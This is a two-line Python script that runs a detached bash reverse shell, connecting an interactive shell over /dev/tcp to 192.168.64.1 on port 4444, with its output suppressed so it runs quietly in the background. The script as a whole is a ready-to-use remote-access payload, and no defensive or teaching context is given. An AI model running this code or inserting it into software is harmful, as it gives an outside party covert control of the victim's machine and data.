import os
os.system("nohup bash -c 'exec bash -i >& /dev/tcp/192.168.64.1/4444 0>&1' >/dev/null 2>&1 &")
